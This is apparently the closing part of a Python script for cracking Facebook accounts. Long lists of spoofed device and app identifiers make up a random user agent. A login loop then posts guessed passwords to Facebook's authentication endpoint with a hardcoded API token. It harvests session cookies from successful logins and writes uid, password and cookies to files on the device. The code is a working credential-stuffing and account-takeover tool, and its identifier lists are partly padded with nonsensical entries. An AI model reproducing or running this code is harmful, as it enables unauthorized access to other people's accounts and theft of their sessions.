    'FBBD/Samsung',
    'FBBD/Apple',
    'FBBD/Google',
    'FBBD/Xiaomi',
    'FBBD/OnePlus',
    'FBBD/Huawei',
    'FBBD/OPPO',
    'FBBD/Vivo',
    'FBBD/Realme',
    'FBBD/Nokia',
    'FBBD/Sony',
    'FBBD/LG',
    'FBBD/Motorola',
    'FBBD/HTC',
    'FBBD/ASUS',
    'FBBD/Lenovo',
    'FBBD/ZTE',
    'FBBD/Alcatel',
    'FBBD/Amazon',
    'FBBD/Razer',
    'FBBD/Essential',
    'FBBD/BlackBerry',
    'FBBD/Microsoft',
    'FBBD/Meizu',
    'FBBD/Palm',
    'FBBD/Nextbit',
    'FBBD/LeEco',
    'FBBD/Sharp',
    'FBBD/TCL',
    'FBBD/Google Pixel',
    'FBBD/Google Nexus',
    'FBBD/Google Pixelbook',
    'FBBD/Google Pixel Slate',
    'FBBD/Google Home',
    'FBBD/Google Chromecast',
    'FBBD/Google Nest',
    'FBBD/Google Stadia',
    'FBBD/Google Wifi',
    'FBBD/Google Daydream',
    'FBBD/Google Glass',
    'FBBD/Google Cardboard',
    'FBBD/Google Clips',
    'FBBD/Google Jamboard',
    'FBBD/Google OnHub',
    'FBBD/Google Pixel Buds',
    'FBBD/Google Pixel Stand',
    'FBBD/Google Titan Security Key',
    'FBBD/Google Titan Security Key Mini',
    'FBBD/Google USB Type-C Earbuds',
    'FBBD/Google USB-C to 3.5mm Headphone Adapter',
    'FBBD/Google Nest Hub',
    'FBBD/Google Nest Hub Max',
    'FBBD/Google Nest Mini',
    'FBBD/Google Nest Wifi',
    'FBBD/Google Pixel 4',
    'FBBD/Google Pixel 4 XL',
    'FBBD/Google Pixel 3',
    'FBBD/Google Pixel 3 XL',
    'FBBD/Google Pixel 3a',
    'FBBD/Google Pixel 3a XL',
    'FBBD/Google Pixel 2',
    'FBBD/Google Pixel 2 XL',
    'FBBD/Google Pixel',
    'FBBD/Google Pixel XL',
    'FBBD/Google Pixel C',
    'FBBD/Google Home Mini',
    'FBBD/Google Home Max',
    'FBBD/Google Nest Hub Max',
    'FBBD/Google Nest Hub',
    'FBBD/Google Chromecast',
    'FBBD/Google Chromecast Ultra',
    'FBBD/Google Chromecast Audio',
    'FBBD/Google Wifi',
    'FBBD/Google Nest Wifi',
    'FBBD/Google Daydream View',
    'FBBD/Google Daydream View (2017)',
    'FBBD/Google Cardboard',
    'FBBD/Google Cardboard (2015)',
    'FBBD/Google Clips',
    'FBBD/Google Jamboard',
    'FBBD/Google Pixel Buds',
    'FBBD/Google Pixel Buds (2017)',
    'FBBD/Google Pixel Buds (2020)',
    'FBBD/Google Pixel Stand',
    'FBBD/Google Titan Security Key',
    'FBBD/Google Titan Security Key Mini',
    'FBBD/Google USB Type-C Earbuds',
    'FBBD/Google USB-C to 3.5mm Headphone Adapter',
    'FBBD/Google Assistant',
    'FBBD/Google Assistant (2016)',
    'FBBD/Google Assistant (2017)',
    'FBBD/Google Assistant (2018)',
    'FBBD/Google Assistant (2019)',
    'FBBD/Google Assistant (2020)',
    'FBBD/Google Assistant (2021)',
    'FBBD/Google Assistant (2022)',
    'FBBD/Google Assistant (2023)',
    'FBBD/Google Assistant (2024)',
    'FBBD/Google Assistant (2025)',
    'FBBD/Google Assistant (2026)',
    'FBBD/Google Assistant (2027)',
    'FBBD/Google Assistant (2028)',
    'FBBD/Google Assistant (2029)',
    'FBBD/Google Assistant (2030)',
    'FBBD/Google Assistant (2031)',
    'FBBD/Google Assistant (2032)',
    'FBBD/Google Assistant (2033)',
    'FBBD/Google Assistant (2034)',
    'FBBD/Google Assistant (2035)',
    'FBBD/Google Assistant (2036)',
    'FBBD/Google Assistant (2037)',
    'FBBD/Google Assistant (2038)',
    'FBBD/Google Assistant (2039)',
    'FBBD/Google Assistant (2040)']
                        fbpn = [
    'com.facebook.katana',  # Facebook
    'com.facebook.lite',    # Facebook Lite
    'com.facebook.orca',    # Facebook Messenger
    'com.facebook.mlite',   # Messenger Lite
    'com.facebook.wakizashi',  # Facebook (old package name)
    'com.facebook.alohawrapper',  # Facebook (Aloha wrapper)
    'com.facebook.arstudio.player',  # Facebook (AR Studio Player)
    'com.facebook.gaming',  # Facebook Gaming
    'com.facebook.work',    # Workplace by Facebook
    'com.facebook.threads',  # Threads from Instagram
    'com.facebook.pages.app',  # Facebook Pages Manager
    'com.facebook.shop',  # Facebook Shop
    'com.facebook.bonfire',  # Facebook Bonfire (discontinued)
    'com.facebook.gameroom',  # Facebook Gameroom
    'com.facebook.creatorstudio',  # Facebook Creator Studio
    'com.facebook.intern',  # Facebook Intern (internal testing)
    'com.facebook.feed',  # Facebook Feed (internal testing)
    'com.facebook.oz',  # Facebook Oz (internal testing)
    'com.facebook.kaios',  # Facebook for KaiOS
    'com.facebook.atlas',  # Facebook Atlas (internal)
    'com.facebook.hyperloop',  # Facebook Hyperloop (internal)
    'com.facebook.katana.dev',  # Facebook (development version)
    'com.facebook.system',  # Facebook System (framework component)
    'com.facebook.system.dev',  # Facebook System (development version)
    'com.facebook.services',  # Facebook Services (framework component)
    'com.facebook.services.dev',  # Facebook Services (development version)
    'com.facebook.appmanager',  # Facebook App Manager (framework component)
    'com.facebook.appmanager.dev',  # Facebook App Manager (development version)
    'com.facebook.katana.orca',  # Facebook + Messenger (old combo)
    'com.facebook.loom',  # Facebook Loom (discontinued)
    'com.facebook.lite.dev',  # Facebook Lite (development version)
    'com.facebook.orca.dev',  # Facebook Messenger (development version)
    'com.facebook.mlite.dev',  # Messenger Lite (development version)
    'com.facebook.wakizashi.dev',  # Facebook (Aloha wrapper, development version)
    'com.facebook.alohawrapper.dev',  # Facebook (Aloha wrapper, development version)
    'com.facebook.arstudio.player.dev',  # Facebook (AR Studio Player, development version)
    'com.facebook.gaming.dev',  # Facebook Gaming (development version)
    'com.facebook.work.dev',  # Workplace by Facebook (development version)
    'com.facebook.threads.dev',  # Threads from Instagram (development version)
    'com.facebook.pages.app.dev',  # Facebook Pages Manager (development version)
    'com.facebook.shop.dev',  # Facebook Shop (development version)
    'com.facebook.bonfire.dev',  # Facebook Bonfire (development version, discontinued)
    'com.facebook.gameroom.dev',  # Facebook Gameroom (development version)
    'com.facebook.creatorstudio.dev',  # Facebook Creator Studio (development version)
    'com.facebook.intern.dev',  # Facebook Intern (internal testing, development version)
    'com.facebook.feed.dev',  # Facebook Feed (internal testing, development version)
    'com.facebook.oz.dev',  # Facebook Oz (internal testing, development version)
    'com.facebook.kaios.dev',  # Facebook for KaiOS (development version)
    'com.facebook.atlas.dev',  # Facebook Atlas (internal, development version)
    'com.facebook.hyperloop.dev',  # Facebook Hyperloop (internal, development version)
    'com.facebook.system.dev',  # Facebook System (framework component, development version)
    'com.facebook.services.dev',  # Facebook Services (framework component, development version)
    'com.facebook.appmanager.dev',  # Facebook App Manager (framework component, development version)
    'com.facebook.katana.orca.dev',  # Facebook + Messenger (old combo, development version)
    'com.facebook.loom.dev',  # Facebook Loom (discontinued, development version)
]
                        fbdv = [
    'FBDV/iPhone12,1',
    'FBDV/iPhone11,8',
    'FBDV/iPhone10,6',
    'FBDV/iPhone9,4',
    'FBDV/iPhone8,1',
    'FBDV/iPhone7,2',
    'FBDV/iPhone6,2',
    'FBDV/Samsung SM-G998U',
    'FBDV/Samsung SM-G991U',
    'FBDV/Samsung SM-G9980',
    'FBDV/Samsung SM-G9910',
    'FBDV/Samsung SM-N986B',
    'FBDV/Samsung SM-N981B',
    'FBDV/Google Pixel 5',
    'FBDV/Google Pixel 4a',
    'FBDV/Google Pixel 3 XL',
    'FBDV/Google Pixel 2',
    'FBDV/OnePlus IN2015',
    'FBDV/OnePlus IN2025',
    'FBDV/OnePlus KB2005',
    'FBDV/OnePlus KB2001',
    'FBDV/Xiaomi Redmi Note 10',
    'FBDV/Xiaomi Redmi Note 9',
    'FBDV/Xiaomi Mi 11',
    'FBDV/Xiaomi Mi 10T',
    'FBDV/Huawei ELS-NX9',
    'FBDV/Huawei ELS-N04',
    'FBDV/Huawei EVR-N29',
    'FBDV/Huawei EVR-L29',
    'FBDV/LG LM-V450',
    'FBDV/LG LM-Q910',
    'FBDV/LG LM-G820',
    'FBDV/LG LM-Q730',
    'FBDV/Sony Xperia 1 III',
    'FBDV/Sony Xperia 5 III',
    'FBDV/Sony Xperia 10 III',
    'FBDV/Sony Xperia 1 II',
    'FBDV/Motorola XT2125-4',
    'FBDV/Motorola XT2113-3',
    'FBDV/Motorola XT2125-3',
    'FBDV/Motorola XT2115-1',
    'FBDV/Nokia TA-1321',
    'FBDV/Nokia TA-1335',
    'FBDV/Nokia TA-1337',
    'FBDV/Nokia TA-1322',
    'FBDV/Asus_I003D',
    'FBDV/Asus_I003DD',
    'FBDV/Asus_I003DA',
    'FBDV/Asus_I003DB',
    'FBDV/Lenovo TB-X606F',
    'FBDV/Lenovo TB-X606X',
    'FBDV/Lenovo TB-X606V',
    'FBDV/Lenovo TB-X606',
    'FBDV/ZTE N928Dt',
    'FBDV/ZTE A2021',
    'FBDV/ZTE N928D',
    'FBDV/ZTE A2020G',
    'FBDV/Alcatel 5033D',
    'FBDV/Alcatel 5033Y',
    'FBDV/Alcatel 5033A',
    'FBDV/Alcatel 5033X',
    'FBDV/Amazon KDFOWI',
    'FBDV/Amazon KFSUWI',
    'FBDV/Amazon KFSAWI',
    'FBDV/Amazon KFDOWI',
    'FBDV/Razer Phone',
    'FBDV/Razer Phone 2',
    'FBDV/Razer Phone 3',
    'FBDV/Essential Products PH-1',
    'FBDV/Essential Products PH-2',
    'FBDV/BlackBerry BBE100-2',
    'FBDV/BlackBerry BBE100-5',
    'FBDV/BlackBerry BBE100-4',
    'FBDV/BlackBerry BBE100-1',
    'FBDV/Microsoft RM-1091',
    'FBDV/Microsoft RM-1109',
    'FBDV/Microsoft RM-1077',
    'FBDV/Microsoft RM-1089',
    'FBDV/Meizu M882Q',
    'FBDV/Meizu M882H',
    'FBDV/Meizu M882A',
    'FBDV/Meizu M882J',
    'FBDV/Palm PVG100',
    'FBDV/Palm PVG100E',
    'FBDV/Palm PVG100EU',
    'FBDV/Palm PVG100EAWW',
    'FBDV/Nextbit Robin',
    'FBDV/Nextbit Robin 2',
    'FBDV/Nextbit Robin 3',
    'FBDV/Nextbit Robin 4',
    'FBDV/LeEco LEX622',
    'FBDV/LeEco LEX720',
    'FBDV/LeEco LEX727',
    'FBDV/LeEco LEX725',
    'FBDV/Sharp Z3',
    'FBDV/Sharp Z2',
    'FBDV/Sharp Z1',
    'FBDV/Sharp Z4',
    'FBDV/TCL 10 SE',
    'FBDV/TCL 10 Plus',
    'FBDV/TCL 10L',
    'FBDV/TCL 10 Pro',
    'FBDV/Google Pixel Slate',
    'FBDV/Google Pixelbook',
    'FBDV/Google Pixelbook Go',
    'FBDV/Google Pixel C',
    'FBDV/Google Nexus 10',
    'FBDV/Google Nexus 9',
    'FBDV/Google Nexus 7',
    'FBDV/Google Nexus 6P',
    'FBDV/Google Nexus 6',
    'FBDV/Google Nexus 5X',
    'FBDV/Google Nexus 5',
    'FBDV/Google Nexus 4',
    'FBDV/Google Glass',
    'FBDV/Google Home',
    'FBDV/Google Home Mini',
    'FBDV/Google Home Max',
    'FBDV/Google Nest Hub',
    'FBDV/Google Nest Hub Max',
    'FBDV/Google Nest Mini',
    'FBDV/Google Nest Audio',
    'FBDV/Google Chromecast',
    'FBDV/Google Chromecast Ultra',
    'FBDV/Google Chromecast Audio',
    'FBDV/Google Pixel Buds']
                        fbsv = [
    'FBSV/13',
    'FBSV/12',
    'FBSV/11',
    'FBSV/10',
    'FBSV/9',
    'FBSV/8',
    'FBSV/7',
    'FBSV/6',
    'FBSV/5',
    'FBSV/4',
    'FBSV/3',
    'FBSV/2',
    'FBSV/1',
    'FBSV/0',
    'FBSV/20',  # Example of a non-sequential value
    'FBSV/19',  # Example of a non-sequential value
    'FBSV/18',  # Example of a non-sequential value
    'FBSV/17',  # Example of a non-sequential value
    'FBSV/16',  # Example of a non-sequential value
    'FBSV/15',  # Example of a non-sequential value
    'FBSV/14',  # Example of a non-sequential value
    'FBSV/29',  # Example of a non-sequential value
    'FBSV/28',  # Example of a non-sequential value
    'FBSV/27',  # Example of a non-sequential value
    'FBSV/26',  # Example of a non-sequential value
    'FBSV/25',  # Example of a non-sequential value
    'FBSV/24',  # Example of a non-sequential value
    'FBSV/23',  # Example of a non-sequential value
    'FBSV/22',  # Example of a non-sequential value
    'FBSV/21',  # Example of a non-sequential value
    'FBSV/39',  # Example of a non-sequential value
    'FBSV/38',  # Example of a non-sequential value
    'FBSV/37',  # Example of a non-sequential value
    'FBSV/36',  # Example of a non-sequential value
    'FBSV/35',  # Example of a non-sequential value
    'FBSV/34',  # Example of a non-sequential value
    'FBSV/33',  # Example of a non-sequential value
    'FBSV/32',  # Example of a non-sequential value
    'FBSV/31',  # Example of a non-sequential value
    'FBSV/30',  # Example of a non-sequential value
    'FBSV/49',  # Example of a non-sequential value
    'FBSV/48',  # Example of a non-sequential value
    'FBSV/47',  # Example of a non-sequential value
    'FBSV/46',  # Example of a non-sequential value
    'FBSV/45',  # Example of a non-sequential value
    'FBSV/44',  # Example of a non-sequential value
    'FBSV/43',  # Example of a non-sequential value
    'FBSV/42',  # Example of a non-sequential value
    'FBSV/41',  # Example of a non-sequential value
    'FBSV/40',  # Example of a non-sequential value
    'FBSV/59',  # Example of a non-sequential value
    'FBSV/58',  # Example of a non-sequential value
    'FBSV/57',  # Example of a non-sequential value
    'FBSV/56',  # Example of a non-sequential value
    'FBSV/55',  # Example of a non-sequential value
    'FBSV/54',  # Example of a non-sequential value
    'FBSV/53',  # Example of a non-sequential value
    'FBSV/52',  # Example of a non-sequential value
    'FBSV/51',  # Example of a non-sequential value
    'FBSV/50',  # Example of a non-sequential value
    'FBSV/69',  # Example of a non-sequential value
    'FBSV/68',  # Example of a non-sequential value
    'FBSV/67',  # Example of a non-sequential value
    'FBSV/66',  # Example of a non-sequential value
    'FBSV/65',  # Example of a non-sequential value
    'FBSV/64',  # Example of a non-sequential value
    'FBSV/63',  # Example of a non-sequential value
    'FBSV/62',  # Example of a non-sequential value
    'FBSV/61',  # Example of a non-sequential value
    'FBSV/60',  # Example of a non-sequential value
    'FBSV/79',  # Example of a non-sequential value
    'FBSV/78',  # Example of a non-sequential value
    'FBSV/77',  # Example of a non-sequential value
    'FBSV/76',  # Example of a non-sequential value
    'FBSV/75',  # Example of a non-sequential value
    'FBSV/74',  # Example of a non-sequential value
    'FBSV/73',  # Example of a non-sequential value
    'FBSV/72',  # Example of a non-sequential value
    'FBSV/71',  # Example of a non-sequential value
    'FBSV/70',  # Example of a non-sequential value
]
                        fbop = [
    'FBOP/1',
    'FBOP/2',
    'FBOP/3',
    'FBOP/4',
    'FBOP/5',
    'FBOP/6',
    'FBOP/7',
    'FBOP/8',
    'FBOP/9',
    'FBOP/10',
    'FBOP/11',
    'FBOP/12',
    'FBOP/13',
    'FBOP/14',
    'FBOP/15',
    'FBOP/16',
    'FBOP/17',
    'FBOP/18',
    'FBOP/19',
    'FBOP/20',
    'FBOP/21',
    'FBOP/22',
    'FBOP/23',
    'FBOP/24',
    'FBOP/25',
    'FBOP/26',
    'FBOP/27',
    'FBOP/28',
    'FBOP/29',
    'FBOP/30',
    'FBOP/31',
    'FBOP/32',
    'FBOP/33',
    'FBOP/34',
    'FBOP/35',
    'FBOP/36',
    'FBOP/37',
    'FBOP/38',
    'FBOP/39',
    'FBOP/40',
    'FBOP/41',
    'FBOP/42',
    'FBOP/43',
    'FBOP/44',
    'FBOP/45',
    'FBOP/46',
    'FBOP/47',
    'FBOP/48',
    'FBOP/49',
    'FBOP/50',
    'FBOP/51',
    'FBOP/52',
    'FBOP/53',
    'FBOP/54',
    'FBOP/55',
    'FBOP/56',
    'FBOP/57',
    'FBOP/58',
    'FBOP/59',
    'FBOP/60',
    'FBOP/61',
    'FBOP/62',
    'FBOP/63',
    'FBOP/64',
    'FBOP/65',
    'FBOP/66',
    'FBOP/67',
    'FBOP/68',
    'FBOP/69',
    'FBOP/70',
    'FBOP/71',
    'FBOP/72',
    'FBOP/73',
    'FBOP/74',
    'FBOP/75',
    'FBOP/76',
    'FBOP/77',
    'FBOP/78',
    'FBOP/79',
    'FBOP/80',
    'FBOP/81',
    'FBOP/82',
    'FBOP/83',
    'FBOP/84',
    'FBOP/85',
    'FBOP/86',
    'FBOP/87',
    'FBOP/88',
    'FBOP/89',
    'FBOP/90',
    'FBOP/91',
    'FBOP/92',
    'FBOP/93',
    'FBOP/94',
    'FBOP/95',
    'FBOP/96',
    'FBOP/97',
    'FBOP/98',
    'FBOP/99',
    'FBOP/100',
    'FBOP/101',
    'FBOP/102',
    'FBOP/103',
    'FBOP/104',
    'FBOP/105',
    'FBOP/106',
    'FBOP/107',
    'FBOP/108',
    'FBOP/109',
    'FBOP/110',
    'FBOP/111',
    'FBOP/112',
    'FBOP/113',
    'FBOP/114',
    'FBOP/115',
    'FBOP/116',
    'FBOP/117',
    'FBOP/118',
    'FBOP/119',
    'FBOP/120',
    'FBOP/121',
    'FBOP/122',
    'FBOP/123',
    'FBOP/124',
    'FBOP/125',
    'FBOP/126',
    'FBOP/127',
    'FBOP/128',
    'FBOP/129',
    'FBOP/130',
    'FBOP/131',
    'FBOP/132',
    'FBOP/133',
    'FBOP/134',
    'FBOP/135',
    'FBOP/136',
    'FBOP/137',
    'FBOP/138',
    'FBOP/139',
    'FBOP/140',
    'FBOP/141',
    'FBOP/142',
    'FBOP/143',
    'FBOP/144',
    'FBOP/145',
    'FBOP/146',
    'FBOP/147',
    'FBOP/148',
    'FBOP/149',
    'FBOP/150',
    'FBOP/151',
    'FBOP/152',
    'FBOP/153',
    'FBOP/154',
    'FBOP/155',
    'FBOP/156',
    'FBOP/157',
    'FBOP/158',
    'FBOP/159',
    'FBOP/160',
    'FBOP/161',
    'FBOP/162',
    'FBOP/163',
    'FBOP/164',
    'FBOP/165',
    'FBOP/166',
    'FBOP/167',
    'FBOP/168',
    'FBOP/169',
    'FBOP/170',
    'FBOP/171',
    'FBOP/172',
    'FBOP/173',
    'FBOP/174',
    'FBOP/175',
    'FBOP/176',
    'FBOP/177',
    'FBOP/178',
    'FBOP/179',
    'FBOP/180',
    'FBOP/181',
    'FBOP/182',
    'FBOP/183',
    'FBOP/184',
    'FBOP/185',
    'FBOP/186',
    'FBOP/187',
    'FBOP/188',
    'FBOP/189',
    'FBOP/190',
    'FBOP/191',
    'FBOP/192',
    'FBOP/193',
    'FBOP/194',
    'FBOP/195',
    'FBOP/196',
    'FBOP/197',
    'FBOP/198',
    'FBOP/199',
    'FBOP/200',]
                        fbca = [
    'FBCA/arm64-v8a;FBMF/Samsung;FBBD/Galaxy S21 Ultra;FBSV/11;FBDM/{density=3.0,width=1440,height=3088};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/OnePlus;FBBD/OnePlus 9 Pro;FBSV/11;FBDM/{density=3.0,width=1440,height=3216};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Xiaomi;FBBD/Mi 11 Ultra;FBSV/11;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Apple;FBBD/iPhone 13 Pro Max;FBSV/15;FBDM/{density=3.0,width=1284,height=2778};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Google;FBBD/Pixel 6 Pro;FBSV/13;FBDM/{density=3.5,width=1440,height=3120};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/OPPO;FBBD/Find X5 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Vivo;FBBD/iQOO 9 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3216};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Realme;FBBD/Realme GT 2 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Nokia;FBBD/Nokia G50;FBSV/12;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Sony;FBBD/Xperia 1 III;FBSV/11;FBDM/{density=3.0,width=1644,height=3840};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Motorola;FBBD/Moto G Stylus 5G;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Huawei;FBBD/Mate 40 Pro;FBSV/10;FBDM/{density=3.0,width=1344,height=2772};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/OPPO;FBBD/Reno6 Pro;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Vivo;FBBD/X60 Pro+;FBSV/11;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Realme;FBBD/Realme 8 Pro;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Nokia;FBBD/Nokia X20;FBSV/11;FBDM/{density=2.5,width=1080,height=2408};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Sony;FBBD/Xperia 10 III;FBSV/11;FBDM/{density=3.0,width=1080,height=2520};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Motorola;FBBD/Moto G Power (2021);FBSV/11;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Huawei;FBBD/P40 Pro;FBSV/10;FBDM/{density=3.0,width=1200,height=2640};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/OnePlus;FBBD/Nord N200 5G;FBSV/11;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Samsung;FBBD/Galaxy A52 5G;FBSV/11;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBCA/arm64-v8a;FBMF/Xiaomi;FBBD/Redmi Note 10 Pro;FBSV/11;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile',
    'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;',
    'FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;',
    'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1478};FBLC/en_US;FBRV/0;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1421};FBLC/en_US;FBRV/0;',
    'FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/537275962;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;',
    'FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/537275962;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;',
    'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;'
    'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;',
    'FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1478};FBLC/en_US;FBRV/0;',
    'FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/537275962;',
    'FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;',
    'FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/537275962;']
                        # Assemble the User-Agent string
                        user_agent = ';'.join(random.choice(part) for part in [fban_fb4a, fbav, fbbv, fban_fb4a, fbav, fbbv, fbdm, fblc, fbrv, fbcr, fbmf, fbbd, fbpn, fbdv, fbsv, fbop, fbca])
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': user_agent, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} (Running) {str(uid)} | {pas} ')
                                print(f'\r{g} (Running) {str(user_agent)} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                open('/sdcard/BHOOT-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (Fucking) {str(uid)} | {pas} ')
                                print(f'\r{g} (Running) {str(user_agent)} ')
                                open('/sdcard/BHOOT-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------[ END-CODE ]-----------------------#
Main()
